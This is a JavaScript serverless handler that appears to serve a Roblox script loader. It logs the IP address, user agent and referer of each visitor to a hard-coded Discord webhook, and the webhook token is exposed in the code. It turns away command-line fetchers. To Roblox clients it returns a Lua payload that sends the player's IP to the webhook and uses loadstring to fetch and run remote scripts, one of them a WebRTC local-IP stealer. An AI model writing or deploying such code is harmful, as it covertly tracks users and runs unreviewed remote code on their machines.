export default async function handler(req, res) {
  const { id } = req.query;

  const realIp = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
                 req.headers['x-real-ip'] ||
                 req.headers['cf-connecting-ip'] ||
                 req.socket.remoteAddress || 'Unknown';

  const userAgent = req.headers['user-agent'] || '';
  const referer = req.headers.referer || 'Direct';

  const WEBHOOK = 'https://discord.com/api/webhooks/1444992746854289408/xElRiKCryMi--rjyZeQYnF4fozUJmW4-pRYpPZ-5cgD4BmrRlr7LTH-aoxrm07VQL2nz';

  const isRoblox = /Roblox|RobloxStudio|RobloxApp/i.test(userAgent);
  
  const isCurlOrFetch = /curl|wget|fetch|httpie|python-requests|node-fetch|axios|postman/i.test(userAgent);
  
  const hasAcceptEncoding = req.headers['accept-encoding'];
  const hasAcceptLanguage = req.headers['accept-language'];
  const hasCurlHeaders = req.headers['accept'] === '*/*' && !hasAcceptLanguage;
  
  const isFakeRoblox = isRoblox && (isCurlOrFetch || hasCurlHeaders);

  const scriptUrl = 'https://raw.githubusercontent.com/Secret-Employee-Hub/SCRIPT-KIDDIE/refs/heads/main/noskidding';

  if (isCurlOrFetch || isFakeRoblox) {
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "CURL/FETCH ATTEMPT BLOCKED",
          color: 16776960,
          fields: [
            { name: "IP", value: realIp, inline: true },
            { name: "User-Agent", value: `\`\`\`${userAgent.substring(0,1000)}\`\`\``, inline: false },
            { name: "Referer", value: referer, inline: false },
            { name: "Detection", value: isFakeRoblox ? "Fake Roblox UA" : "CLI Tool", inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    return res.status(403).send('ANO I-FEFETCH MOPA? BOBO WAG KANA UMASA');
  }

  if (!isRoblox) {
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "SKIDDER INFO",
          color: 16711680,
          fields: [
            { name: "IP", value: realIp, inline: true },
            { name: "User-Agent", value: `\`\`\`${userAgent.substring(0,1000)}\`\`\``, inline: false },
            { name: "Referer", value: referer, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    return res.status(403).send(`
    𝗦𝗞𝗜𝗗𝗗𝗘𝗥 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗 𝗜𝗣 𝗚𝗥𝗔𝗕𝗕𝗘𝗗 𝗕𝗬 > 𝗭𝗜𝗬𝗨𝗦              
    `.trim());
  }

  const payload = `
spawn(function()
    local http = game:GetService("HttpService")
    http:PostAsync("${WEBHOOK}", http:JSONEncode({
        embeds = {{
            title = "SKIDDER INFO",
            color = 65280,
            fields = {
                {name = "Public IP", value = "${realIp}", inline = true},
                {name = "User-Agent", value = "${userAgent.replace(/"/g, '\\"').substring(0,1000)}"}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }), Enum.HttpContentType.ApplicationJson)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/public/main/ip-loggers/webrtc-localip-stealer.lua"))()

loadstring(game:HttpGet("${scriptUrl}"))()
  `.trim();

  fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title: "SKIDDER EXECUTED",
        color: 65311,
        fields: [
          { name: "IP", value: realIp, inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send(payload);
}

export const config = {
  api: {
    bodyParser: false,
  },
};
